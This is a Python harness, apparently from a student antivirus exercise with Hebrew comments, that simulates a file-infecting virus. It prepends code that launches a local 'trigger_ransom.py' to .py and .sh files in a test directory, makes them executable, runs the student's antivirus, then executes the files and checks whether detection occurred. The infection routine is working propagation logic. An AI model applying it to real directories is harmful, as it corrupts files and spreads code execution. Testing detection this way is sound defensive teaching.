import os
import subprocess
import time
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from modules.utils import log_summary
from modules.constants import DETECTION_FILE
BLOCK_FILE = "/tmp/block_ransom"

INFECTION_MARKER = "#infected"
TRIGGER_SCRIPT_PATH = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "simulation", "trigger_ransom.py")
)
INJECTION_CODE = (
    f"{INFECTION_MARKER}\n"
    "import os\n"
    f"os.system('python3 {TRIGGER_SCRIPT_PATH}')\n"
).replace("{TRIGGER_SCRIPT_PATH}", TRIGGER_SCRIPT_PATH)


TARGET_DIR = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..", "tmp", "TestInfected")
)
TARGET_EXTENSIONS = ['.py', '.sh']


def clear_detection_log():
    try:
        open(DETECTION_FILE, "w").close()
    except:
        pass

def was_detected():
    try:
        with open(DETECTION_FILE) as f:
            return bool(f.read().strip())
    except:
        return False

def infect_file(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()

        if INFECTION_MARKER in content:
            return  # כבר הודבק

        if filepath.endswith('.sh') and not content.startswith("#!"):
            content = "#!/bin/bash\n" + content

        with open(filepath, 'w') as f:
            f.write(INJECTION_CODE + content)

        os.chmod(filepath, 0o755)
        print(f"[+] Infected: {filepath}")

    except Exception as e:
        print(f"[-] Failed to infect {filepath}: {e}")

def scan_and_infect(directory):
    for root, _, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                infect_file(filepath)

def run_infected_files(directory):
    if os.path.exists(BLOCK_FILE):
        print("🔒 חסימה הופעלה – לא נריץ קבצים נגועים.")
        return

    for root, _, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                print(f"[>] Executing: {filepath}")
                try:
                    if filename.endswith('.sh'):
                        subprocess.run([filepath])
                    elif filename.endswith('.py'):
                        subprocess.run(['python3', filepath])
                except Exception as e:
                    print(f"[!] Failed to execute {filename}: {e}")

def run_student_antivirus():
    path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "tmp", "student_antivirus.py")
    )
    subprocess.run(["python3", path])

if __name__ == "__main__":
    log_summary("[SYSTEM] סימולציית infection הופעלה", "system")

    print("[*] שלב 1: ניקוי קובץ זיהוי")
    clear_detection_log()
        

    if os.path.exists(BLOCK_FILE):
        os.remove(BLOCK_FILE)

    print("[*] שלב 2: הדבקת קבצים נגועים (ללא הרצה)")
    scan_and_infect(TARGET_DIR)

    print("[*] שלב 3: הרצת אנטי וירוס של התלמיד")
    run_student_antivirus()
    time.sleep(0.5)  # תן לאנטי וירוס לפעול

    print("[*] שלב 4: הרצת קבצים נגועים בפועל")
    run_infected_files(TARGET_DIR)

    print("[*] שלב 5: בדיקת זיהוי")
    if was_detected():
        log_summary("[OK] זיהוי הצליח בסימולציית infection", "success")
    else:
        log_summary("[FAIL] לא זוהתה הדבקה בזמן בסימולציית infection", "fail")
